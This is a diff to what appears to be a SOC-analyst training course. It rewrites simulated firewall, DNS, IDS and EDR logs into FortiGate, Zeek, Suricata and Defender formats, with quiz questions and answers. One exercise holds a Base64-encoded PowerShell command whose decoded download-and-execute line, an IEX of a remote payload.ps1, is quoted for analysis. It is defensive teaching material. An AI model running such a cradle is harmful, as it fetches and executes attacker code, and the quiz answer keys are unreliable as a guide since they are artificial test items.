@@ -454,6 +454,7 @@ When you're investigating a security incident, these networking concepts form yo
           id: "evt-net-001",
           ts: "2025-11-14T02:47:33Z",
           source: "firewall" as const,
+          vendor: "Fortinet FortiGate",
           event_type: "net_connection" as const,
           severity: "high" as const,
           hostname: "CORP-WS-0047",
@@ -462,24 +463,48 @@ When you're investigating a security incident, these networking concepts form yo
           dst_port: 4444,
           description:
             "Outbound TCP connection established to external host on non-standard port",
+          // FortiGate traffic log (FortiOS 7.x key names, as the Live Feed renders FortiGate),
+          // written when the session closed after 347 seconds.
           raw: {
-            action: "allow",
-            protocol: "TCP",
-            src_ip: "10.5.12.47",
-            src_port: 51234,
-            dst_ip: "203.0.113.34",
-            dst_port: 4444,
-            bytes_sent: 2048,
-            bytes_received: 8192,
-            connection_state: "ESTABLISHED",
-            duration_sec: 347,
-            hostname: "CORP-WS-0047",
-            username: "jsmith",
-            rule_matched: "DEFAULT-ALLOW-OUTBOUND",
-            timestamp: "2025-11-14T02:47:33Z",
-            nat_src_ip: "203.0.113.15",
-            nat_src_port: 51234,
-            geo_dst_country: "RU",
+            date: "2025-11-14",
+            time: "02:47:33",
+            devname: "FGT-CORP-EDGE",
+            devid: "FG100FTK21004417",
+            eventtime: 1763088453000000000,
+            tz: "+0000",
+            logid: "0000000013",
+            type: "traffic",
+            subtype: "forward",
+            level: "notice",
+            vd: "root",
+            srcip: "10.5.12.47",
+            srcport: 51234,
+            srcintf: "port2",
+            srcintfrole: "lan",
+            dstip: "203.0.113.34",
+            dstport: 4444,
+            dstintf: "port1",
+            dstintfrole: "wan",
+            srccountry: "Reserved",
+            dstcountry: "Russian Federation",
+            sessionid: 31877412,
+            proto: 6,
+            action: "close",
+            policyid: 1,
+            policytype: "policy",
+            poluuid: "8a3f1c62-41d7-51ef-0b2d-6c9e7f40a1d3",
+            policyname: "DEFAULT-ALLOW-OUTBOUND",
+            user: "jsmith",
+            service: "tcp/4444",
+            trandisp: "snat",
+            transip: "203.0.113.15",
+            transport: 51234,
+            duration: 347,
+            sentbyte: 2048,
+            rcvdbyte: 8192,
+            sentpkt: 14,
+            rcvdpkt: 12,
+            appcat: "unscanned",
           },
         },
         questions: [
@@ -494,12 +519,12 @@ When you're investigating a security incident, these networking concepts form yo
             ],
             answer: 1,
             explanation:
-              "The destination port is 4444 (visible in dst_port field). Port 4444 is NOT in the approved list of 80, 443, and 53. Critically, port 4444 is the default listener port for Metasploit's Meterpreter reverse shell: one of the most commonly used attacker tools. The connection lasted 347 seconds and the destination is in Russia (geo_dst_country: RU), making this highly suspicious.",
+              "The destination port is 4444 (FortiGate calls the field dstport; service tcp/4444 says the same). Port 4444 is NOT in the approved list of 80, 443, and 53. Critically, port 4444 is the default listener port for Metasploit's Meterpreter reverse shell: one of the most commonly used attacker tools. The session lasted 347 seconds (duration: 347, logged when it closed: action close) and the destination is in Russia (dstcountry: Russian Federation), making this highly suspicious.",
             xp: 20,
           },
           {
             question:
-              "The log shows src_ip: 10.5.12.47 and nat_src_ip: 203.0.113.15. What does this tell you?",
+              "The log shows srcip: 10.5.12.47, trandisp: snat and transip: 203.0.113.15. What does this tell you?",
             options: [
               "Source spoofing: the attacker forged 10.5.12.47 and the firewall recorded the true address as 203.0.113.15",
               "The workstation has two network interfaces, and the firewall logged both of its addresses",
@@ -519,7 +544,7 @@ When you're investigating a security incident, these networking concepts form yo
         prompt:
           "Looking at the firewall log above: the suspicious connection from CORP-WS-0047. What is the exact destination port number that the connection was made to? Enter the port number only.",
         answer: "4444",
-        hint: "Look for the dst_port field in the raw log data.",
+        hint: "FortiGate names the destination port field dstport.",
         xp: 25,
       },
     ],
@@ -754,7 +779,7 @@ ICMP is often allowed through firewalls for diagnostic purposes, which attackers
         type: "question" as const,
         id: "net-prot-q2",
         question:
-          "A SOC analyst sees 847 authentication failure events from external IP 45.33.32.156 against port 3389 on a corporate server over 2 minutes, followed by 1 authentication success. What should the analyst find out first?",
+          "A SOC analyst sees 847 authentication failure events from external IP 198.51.100.61 against port 3389 on a corporate server over 2 minutes, followed by 1 authentication success. What should the analyst find out first?",
         options: [
           "Whether a user has an old saved password that keeps retrying",
           "Whether the same IP also tried port 22, to see if it is SSH too",
@@ -862,11 +887,12 @@ These questions form the foundation of network-based threat investigation.`,
         id: "net-prot-la1",
         heading: "Suspicious DNS Query: What Is This Workstation Doing?",
         context:
-          "Your SIEM has flagged a DNS query from a workstation. The company's internal DNS server is 10.0.0.53. Analyze the event.",
+          "Your SIEM has flagged DNS traffic from workstation CORP-WS-0112 (10.2.8.112). The company's internal DNS server is 10.0.0.53. The record below comes from the Zeek network sensor on the office uplink, which logs every DNS query it sees on the wire, whichever resolver it goes to.\n\n**What the SIEM tells you:** its DNS dashboard for this host shows 312 queries in the last hour to 289 different domains, almost all answered NXDOMAIN. A single DNS record never carries counts like these; they come from the SIEM counting many records.\n\nAnalyze the event.",
         event: {
           id: "evt-dns-001",
           ts: "2025-11-15T03:22:17Z",
           source: "dns" as const,
+          vendor: "Zeek",
           event_type: "dns_query" as const,
           severity: "high" as const,
           hostname: "CORP-WS-0112",
@@ -879,18 +905,31 @@ These questions form the foundation of network-based threat investigation.`,
             query: "xk3r9qlpmf7wz2.com",
             response: "NXDOMAIN",
           },
+          // Zeek dns.log record (native field names). Zeek sees packets, not users, so there is
+          // no user name; the SIEM's hourly counts are in the task context, not in the record.
           raw: {
-            src_ip: "10.2.8.112",
-            dst_ip: "8.8.8.8",
-            dst_port: 53,
-            protocol: "UDP",
-            dns_query: "xk3r9qlpmf7wz2.com",
-            dns_response: "NXDOMAIN",
-            hostname: "CORP-WS-0112",
-            username: "mwilson",
-            query_count_last_hour: 312,
-            unique_domains_queried: 289,
-            timestamp: "2025-11-15T03:22:17Z",
+            ts: 1763176937.214806,
+            uid: "CmL4Qd2hX1yVb8fT3e",
+            "id.orig_h": "10.2.8.112",
+            "id.orig_p": 61842,
+            "id.resp_h": "8.8.8.8",
+            "id.resp_p": 53,
+            proto: "udp",
+            trans_id: 48213,
+            rtt: 0.021433,
+            query: "xk3r9qlpmf7wz2.com",
+            qclass: 1,
+            qclass_name: "C_INTERNET",
+            qtype: 1,
+            qtype_name: "A",
+            rcode: 3,
+            rcode_name: "NXDOMAIN",
+            AA: false,
+            TC: false,
+            RD: true,
+            RA: true,
+            Z: 0,
+            rejected: false,
           },
         },
         questions: [
@@ -910,7 +949,7 @@ These questions form the foundation of network-based threat investigation.`,
           },
           {
             question:
-              "The log shows dst_ip: 8.8.8.8 instead of 10.0.0.53 (the corporate DNS). What is the security significance of this?",
+              "The record shows id.resp_h (the resolver that was asked): 8.8.8.8 instead of 10.0.0.53 (the corporate DNS). What is the security significance of this?",
             options: [
               "8.8.8.8 is faster, so Windows prefers it whenever both are reachable: a performance choice",
               "The workstation bypassed corporate DNS for Google's resolver, evading its monitoring and filtering",
@@ -978,7 +1017,7 @@ Packet filtering firewalls examine each packet in isolation based on:
 - Destination port
 - Protocol (TCP, UDP, ICMP)
 
-Rules look like: "ALLOW TCP from any to 10.1.1.1 port 443" or "DENY all from 1.2.3.4".
+Rules look like: "ALLOW TCP from any to 10.1.1.1 port 443" or "DENY all from 203.0.113.66".
 
 **Critical limitation:** Stateless. The firewall doesn't know if a packet is part of an established connection or a new attack. An attacker can send a crafted packet that looks like part of a legitimate connection (with the right flags set) and it might pass through.
 
@@ -1221,40 +1260,23 @@ A typical firewall log entry contains these key fields:
 
 **duration:** How long the connection lasted. A 5-second connection is very different from a 3-hour connection.
 
+**Every vendor names these fields its own way.** A FortiGate, for example, writes them as srcip, srcport, dstip, dstport, proto (6 = TCP, 17 = UDP), action, policyname, sentbyte, rcvdbyte and duration. Learn the idea once, then learn each product's spelling.
+
 **Reading a Deny Log: What Happened?**
 
-Let's walk through a real example:
+Let's walk through a real example, a FortiGate traffic log:
 
-  timestamp: 2025-11-14T09:15:43Z
-  src_ip: 45.227.255.206
-  src_port: 52341
-  dst_ip: 10.0.1.50
-  dst_port: 22
-  protocol: TCP
-  action: DROP
-  rule_name: BLOCK-SSH-FROM-INTERNET
-  bytes_sent: 60
-  bytes_received: 0
+  date=2025-11-14 time=09:15:43 devname="FGT-CORP-EDGE" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=198.51.100.23 srcport=52341 srcintf="port1" srcintfrole="wan" dstip=203.0.113.10 dstport=22 dstintf="port3" dstintfrole="dmz" proto=6 action="deny" policyid=12 policyname="BLOCK-SSH-FROM-INTERNET" service="SSH" sentpkt=1 rcvdpkt=0
 
-Reading this: At 9:15 AM UTC, an external IP (45.227.255.206, definitely a public IP) attempted to connect to our web server (10.0.1.50) on port 22 (SSH). The firewall dropped the packet (silently rejected). The rule BLOCK-SSH-FROM-INTERNET matched. No data was received (blocked before connection established).
+Reading this: At 9:15 AM UTC, an external IP (198.51.100.23, a public address) tried to reach our web server's public address (203.0.113.10) on port 22 (SSH). The firewall denied it under the rule BLOCK-SSH-FROM-INTERNET. One packet arrived and nothing came back (rcvdpkt=0): the connection never formed.
 
 Analysis: Someone outside is trying to SSH into our web server. This is a common attack. Attackers scan the internet for exposed SSH servers. The firewall is correctly blocking it. However, if you see hundreds of these from different IPs, it might be worth investigating and potentially geoblock or add to a blocklist.
 
 **Reading an Allow Log: Is This Good or Bad?**
 
-  timestamp: 2025-11-15T02:47:33Z
-  src_ip: 10.5.12.47
-  src_port: 51234
-  dst_ip: 203.0.113.34
-  dst_port: 4444
-  protocol: TCP
-  action: ALLOW
-  rule_name: DEFAULT-ALLOW-OUTBOUND
-  bytes_sent: 2048
-  bytes_received: 8192
-  duration: 347
+  date=2025-11-14 time=02:47:33 devname="FGT-CORP-EDGE" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=10.5.12.47 srcport=51234 srcintf="port2" srcintfrole="lan" dstip=203.0.113.34 dstport=4444 dstintf="port1" dstintfrole="wan" proto=6 action="close" policyid=1 policyname="DEFAULT-ALLOW-OUTBOUND" service="tcp/4444" duration=347 sentbyte=2048 rcvdbyte=8192
 
-The action is ALLOW, so this passed. But should it have? An internal workstation connecting to an external IP on port 4444 for 347 seconds is very suspicious. Port 4444 is a common reverse shell port. The rule that allowed it is "DEFAULT-ALLOW-OUTBOUND": a generic catch-all rule, not a specific intentional allow.
+The policy allowed it (action close means the session was allowed and later ended normally), so this passed. But should it have? An internal workstation connecting to an external IP on port 4444 for 347 seconds is very suspicious. Port 4444 is a common reverse shell port. The rule that allowed it is "DEFAULT-ALLOW-OUTBOUND": a generic catch-all rule, not a specific intentional allow.
 
 This is exactly the kind of finding a SOC analyst should escalate: the firewall allowed it, but the behavior looks like malware. Allowed traffic is not the same as safe traffic.
 
@@ -1273,14 +1295,15 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
         id: "fw-la1",
         heading: "Port Scan Detection: Network Reconnaissance Alert",
         context:
-          "Your IDS has flagged an alert on the perimeter network. An external IP address appears to be conducting a port scan against your company's internet-facing IP range. Port scans are a common first step in network reconnaissance. Attackers map out what services are running before choosing an attack vector. Review the IDS alert below.",
+          "Your IDS has flagged an alert on the perimeter network. An external IP address appears to be conducting a port scan against your company's internet-facing IP range. Port scans are a common first step in network reconnaissance. Attackers map out what services are running before choosing an attack vector.\n\n**What the SIEM tells you:** it grouped this alert with 13 more of the same signature from the same source within 40 seconds, 14 in all, each a single SYN to a different port of 203.0.113.10: 21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3389 and 8080.\n\n**What the log itself tells you:** the Suricata alert below is one of the 14, the probe to port 3389. Review it.",
         event: {
           id: "evt-ids-001",
-          ts: "2025-11-18T22:03:44Z",
+          ts: "2025-11-18T22:03:44.612Z",
           source: "ids" as const,
+          vendor: "Suricata",
           event_type: "ids_signature" as const,
           severity: "medium" as const,
-          src_ip: "91.235.234.192",
+          src_ip: "198.51.100.147",
           dst_ip: "203.0.113.10",
           description:
             "IDS scan signature on a perimeter address",
@@ -1288,12 +1311,14 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
           raw: {
             timestamp: "2025-11-18T22:03:44.612+0000",
             flow_id: 1204855316092741,
+            in_iface: "ens1f0",
             event_type: "alert",
-            src_ip: "91.235.234.192",
+            src_ip: "198.51.100.147",
             src_port: 45821,
             dest_ip: "203.0.113.10",
-            dest_ports_scanned: [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3389, 8080],
+            dest_port: 3389,
             proto: "TCP",
+            pkt_src: "wire/pcap",
             alert: {
               action: "allowed",
               gid: 1,
@@ -1303,13 +1328,20 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
               category: "Attempted Information Leak",
               severity: 2,
             },
+            flow: {
+              pkts_toserver: 1,
+              pkts_toclient: 1,
+              bytes_toserver: 58,
+              bytes_toclient: 54,
+              start: "2025-11-18T22:03:44.611+0000",
+            },
             host: "ids-edge-01",
           },
         },
         questions: [
           {
             question:
-              "The signature is 'ET SCAN NMAP -sS window 1024' and the sensor logged 14 SYN probes to 14 ports. In the context of TCP's three-way handshake, what does this indicate about the scan technique?",
+              "The signature is 'ET SCAN NMAP -sS window 1024' and the SIEM counted 14 of these alerts, one SYN to each of 14 ports, each flow a single packet each way. In the context of TCP's three-way handshake, what does this indicate about the scan technique?",
             options: [
               "Final ACKs were dropped on an unstable link: a real scan completes every handshake before marking a port open",
               "A SYN (half-open) scan: SYN probes read as SYN-ACK or RST, and the final ACK is never sent",
@@ -1323,7 +1355,7 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
           },
           {
             question:
-              "Looking at the dest_ports_scanned list, which port should be most concerning if found open and accessible from the internet?",
+              "Looking at the 14 ports the SIEM listed in the context, which port should be most concerning if found open and accessible from the internet?",
             options: [
               "Port 80, because plain HTTP sends web traffic unencrypted",
               "Port 23, because Telnet is an old protocol that few people use",
@@ -1758,11 +1790,12 @@ This is exactly why the indicators from the previous reading matter as much as t
         id: "win-fund-la1",
         heading: "Suspicious PowerShell Execution: Encoded Command Alert",
         context:
-          "Windows Defender for Endpoint (MDE / Microsoft Defender for Endpoint) has flagged a suspicious process creation event on a workstation. The alert was triggered by PowerShell executing an encoded command shortly after a user opened an email attachment (a .docm Word file).",
+          "Microsoft Defender for Endpoint (MDE) has flagged a suspicious process creation event on a workstation. The alert was triggered by PowerShell executing an encoded command shortly after a user opened an email attachment (a .docm Word file). Below is the process-creation row from MDE Advanced Hunting (table DeviceProcessEvents): the new process is in the File/Process columns, the process that started it in the InitiatingProcess columns.",
         event: {
           id: "evt-ps-001",
-          ts: "2025-11-20T10:14:22Z",
+          ts: "2025-11-20T10:14:22.381Z",
           source: "edr" as const,
+          vendor: "Microsoft Defender for Endpoint",
           event_type: "process_create" as const,
           severity: "critical" as const,
           hostname: "CORP-WS-0203",
@@ -1776,21 +1809,34 @@ This is exactly why the indicators from the previous reading matter as much as t
             cmdline:
               "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAuADUAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
           },
+          // Defender for Endpoint Advanced Hunting row (DeviceProcessEvents columns). MDE records the
+          // command line exactly as typed; decoding the Base64 is the analyst's step, not a field.
           raw: {
-            "mde.event_type": "ProcessCreated",
-            "process.name": "powershell.exe",
-            "process.path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-            "process.pid": 6712,
-            "process.parent.name": "winword.exe",
-            "process.parent.path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-            "process.parent.pid": 4892,
-            "process.command_line":
+            Timestamp: "2025-11-20T10:14:22.3810000Z",
+            DeviceId: "7e1f3b9a04c2d85e6f1a2b3c4d5e6f708192a3b4",
+            DeviceName: "corp-ws-0203.corp.company.com",
+            ActionType: "ProcessCreated",
+            FileName: "powershell.exe",
+            FolderPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            SHA1: "6cbce4a295c163791b60fc23d285e6d84f28ee4c",
+            ProcessId: 6712,
+            ProcessCommandLine:
               "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAuADUAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
-            "process.command_line_decoded":
-              "IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/payload.ps1')",
-            "user.name": "CORP\\jdoe",
-            "host.name": "CORP-WS-0203",
-            timestamp: "2025-11-20T10:14:22Z",
+            ProcessCreationTime: "2025-11-20T10:14:22.3794452Z",
+            ProcessIntegrityLevel: "Medium",
+            ProcessTokenElevation: "TokenElevationTypeLimited",
+            AccountDomain: "corp",
+            AccountName: "jdoe",
+            AccountSid: "S-1-5-21-3623811015-3361044348-30300820-1187",
+            InitiatingProcessFileName: "WINWORD.EXE",
+            InitiatingProcessFolderPath: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            InitiatingProcessId: 4892,
+            InitiatingProcessCommandLine:
+              "\"WINWORD.EXE\" /n \"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8K2QZ1LM\\Invoice_Nov2025.docm\" /o \"\"",
+            InitiatingProcessParentFileName: "OUTLOOK.EXE",
+            InitiatingProcessParentId: 3316,
+            InitiatingProcessAccountName: "jdoe",
+            ReportId: 18233,
           },
         },
         questions: [
@@ -1810,7 +1856,7 @@ This is exactly why the indicators from the previous reading matter as much as t
           },
           {
             question:
-              "The decoded_command field shows: 'IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/payload.ps1')'. What is this command doing?",
+              "-EncodedCommand takes Base64 of UTF-16LE text. You paste the value into CyberChef (From Base64, then Decode text UTF-16LE) and get: 'IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.50/payload.ps1')'. What is this command doing?",
             options: [
               "Downloading payload.ps1 from an internal server and saving it to disk for later review",
               "Fetching a configuration file from 192.168.10.50 and reading it as plain text data",
@@ -1830,7 +1876,7 @@ This is exactly why the indicators from the previous reading matter as much as t
         prompt:
           "In the PowerShell alert above, what is the PID of the parent process that spawned PowerShell? Enter the number only.",
         answer: "4892",
-        hint: "PowerShell's own PID is not the one you want. Find the parent's in the raw log data.",
+        hint: "PowerShell's own PID (ProcessId) is not the one you want. Defender for Endpoint calls the parent the InitiatingProcess.",
         xp: 25,
       },
     ],
